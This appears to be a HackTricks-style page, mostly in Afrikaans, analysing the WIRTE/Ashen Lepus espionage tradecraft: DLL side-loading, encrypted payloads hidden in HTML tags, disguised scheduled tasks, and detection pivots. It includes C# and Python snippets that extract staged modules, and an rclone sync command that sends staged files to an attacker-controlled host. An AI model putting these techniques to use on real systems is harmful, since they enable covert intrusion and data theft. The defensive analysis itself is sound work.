# Gevorderde DLL Side-Loading met HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) het 'n herhaalbare patroon gewapen wat DLL sideloading, staged HTML payloads, en modulêre .NET backdoors koppel om volhoubaar binne Midde-Oosterse diplomatieke netwerke te bly. Die tegniek is herbruikbaar deur enige operateur omdat dit staatmaak op:

- **Archive-based social engineering**: regverdige PDFs instrueer teikens om 'n RAR-argief van 'n file-sharing site af te haal. Die argief bevat 'n realistiese dokumentkyker EXE, 'n kwaadwillige DLL met die naam van 'n betroubare biblioteek (bv. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), en 'n lok-`Document.pdf`.
- **DLL search order abuse**: die slagoffer dubbelkliek die EXE, Windows los die DLL-import uit die huidige gids op, en die kwaadwillige loader (AshenLoader) voer binne die vertroude proses uit terwyl die lok-PDF oopmaak om verdagtheid te voorkom.
- **Living-off-the-land staging**: elke latere fase (AshenStager → AshenOrchestrator → modules) word van die skyf verwyder totdat dit nodig is, en afgelewer as versleutelde blobs weggesteek binne andersins onskadelike HTML-antwoorde.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: die EXE side-loads AshenLoader, wat host recon uitvoer, dit met AES-CTR enkripteer, en dit in 'n POST plaas binne wisselende parameters soos `token=`, `id=`, `q=`, of `auth=` na API-agtige paaie (bv. `/api/v2/account`).
2. **HTML extraction**: die C2 verraai die volgende fase slegs wanneer die client IP na die teikengebied gegeolokaliseer word en die `User-Agent` by die implant pas, wat sandboxes frustreer. Wanneer die kontroles slaag, bevat die HTTP-body 'n `<headerp>...</headerp>`-blob met die Base64/AES-CTR-versleutelde AshenStager payload.
3. **Second sideload**: AshenStager word saam met nog 'n wettige binêre gedeploy wat `wtsapi32.dll` importeer. Die kwaadwillige kopie wat in die binêre geïnjekteer is, haal meer HTML op en kerf hierdie keer `<article>...</article>` uit om AshenOrchestrator te herstel.
4. **AshenOrchestrator**: 'n modulêre .NET-controller wat 'n Base64 JSON-config dekodeer. Die config se `tg` en `au` velde word gekonkateneer/gehash tot die AES-sleutel, wat `xrk` ontsleutel. Die resulterende bytes dien as 'n XOR-sleutel vir elke module-blob wat daarna opgehaal word.
5. **Module delivery**: elke module word beskryf deur HTML-kommentaar wat die parser na 'n arbitrêre tag herlei, en statiese reëls wat slegs na `<headerp>` of `<article>` kyk, omseil. Modules sluit in persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), en file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Selfs al blokkeer of verwyder verdedigers 'n spesifieke element, hoef die operateur net die tag wat in die HTML-opmerking aangedui is te verander om die lewering te hervat.

### Vinnige Uittrekkingshulp (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallelle

Onlangse HTML smuggling navorsing (Talos) beklemtoon payloads wat as Base64-stringe binne `<script>`-blokkies in HTML-aanhangsels versteek is en tydens runtime deur JavaScript gedekodeer word. Dieselfde truuk kan hergebruik word vir C2-antwoorde: stage enkripteerde blobs binne 'n script tag (of ander DOM-element) en dekodeer dit in-geheue voor AES/XOR, sodat die bladsy soos gewone HTML lyk. Talos wys ook gelaagde obfuskasie (identifier renaming plus Base64/Caesar/AES) binne `<script>`-tags, wat netjies kaart na HTML-staged C2 blobs.

## Onlangse Variantopmerkings (2024-2025)

- Check Point het WIRTE-kampanjes in 2024 waargeneem wat steeds op archive-based sideloading berus het maar `propsys.dll` (stagerx64) as die eerste fase gebruik het. Die stager dekodeer die volgende payload met Base64 + XOR (sleutel `53`), stuur HTTP-versoeke met 'n hardcoded `User-Agent`, en ekstraheer enkripteerde blobs ingebed tussen HTML-tags. In een tak is die fase herbou uit 'n lang lys ingebedde IP-stringe wat via `RtlIpv4StringToAddressA` gedekodeer is en dan saamgevoeg tot die payload-bytes.
- OWN-CERT het vroeër WIRTE-gereedskap gedokumenteer waar die side-loaded `wtsapi32.dll` dropper strings beskerm het met Base64 + TEA en die DLL-naam self as die dekodesleutel gebruik het, en toe XOR/Base64-obfuskasie op host-identifikasie-data toegepas het voordat dit na die C2 gestuur is.

## Crypto & C2 Verharding

- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) en voeg opsioneel 'n XOR-laag by met strings soos `msasn1.dll` voor/na dekripsie.
- **Key material variations**: earlier loaders used Base64 + TEA om ingebedde strings te beskerm, met die dekripsie-sleutel afgelei van die kwaadwillige DLL-naam (bv. `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: staging servers is per tool geskei, gehost oor verskeie ASNs, en soms voorgehou deur legitiem-lykende subdomains, sodat die verbranding van een fase nie die res blootstel nie.
- **Recon smuggling**: opgesomde data sluit nou Program Files-lyste in om hoë-waarde toepassings te identifiseer en word altyd enkripteer voordat dit die gasheer verlaat.
- **URI churn**: query-parameters en REST-paaie roteer tussen veldtogte (`/api/v1/account?token=` → `/api/v2/account?auth=`), wat brose detections ongeldig maak.
- **User-Agent pinning + safe redirects**: C2-infrastruktuur reageer slegs op presiese UA-stringe en herlei anders na onskadelike nuus-/gesondheidswebwerwe om in te meng.
- **Gated delivery**: servers is geo-gefens en antwoord slegs aan werklike implants. Nie-goedgekeurde kliënte ontvang onsuspicious HTML.

## Persistensie & Uitvoeringslus

AshenStager gooi scheduled tasks wat as Windows onderhoudswerke camoufleer en deur `svchost.exe` uitgevoer word, bv.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Hierdie take her-lanseer die sideloading-ketting by opstart of op intervalle, wat verseker dat AshenOrchestrator vars modules kan versoek sonder om weer die skyf te raak.

## Using Benign Sync Clients for Exfiltration

Operators stage diplomatic documents inside `C:\Users\Public` (world-readable and non-suspicious) deur 'n toegewyde module, en laai dan die legitieme [Rclone](https://rclone.org/) binary af om daardie gids met aanvaller-opberging te sinkroniseer. Unit42 merk op dat dit die eerste keer is dat hierdie aktor Rclone vir exfiltration gebruik het, wat ooreenstem met die breër neiging om legitieme sync-instrumente te misbruik om in normale verkeer in te meng:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` sodat die verkeer soos normale cloud-backups lyk.

Omdat Rclone wyd gebruik word vir regmatige backup-werkvloeie, moet verdedigers fokus op anomalous uitgawe (nuwe binaries, vreemde remotes, of skielike sinkronisering van `C:\Users\Public`).

## Detection Pivots

- Alert op **signed processes** wat onverwagte DLLs uit user-writable paths laai (Procmon filters + `Get-ProcessMitigation -Module`), veral wanneer die DLL-name ooreenstem met `netutils`, `srvcli`, `dwampi`, of `wtsapi32`.
- Inspekteer verdagte HTTPS-antwoorde vir **large Base64 blobs embedded inside unusual tags** of wat deur `<!-- TAG: <xyz> -->` kommentare beskerm word.
- Brei HTML-hunting uit na **Base64 strings inside `<script>` blocks** (HTML smuggling-styl staging) wat deur JavaScript gedekodeer word voor AES/XOR verwerking.
- Jaag vir **scheduled tasks** wat `svchost.exe` met nie-service argumente laat loop of terugwys na dropper-gidse.
- Volg **C2 redirects** wat slegs payloads teruggee vir presiese `User-Agent`-strings en anders na wettige nuus-/gesondheidsdomeine bounce.
- Monitor vir **Rclone** binaries wat buite IT-geskepte liggings verskyn, nuwe `rclone.conf`-lêers, of sync-jobs wat staging-gidse soos `C:\Users\Public` trek.

## Verwysings

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
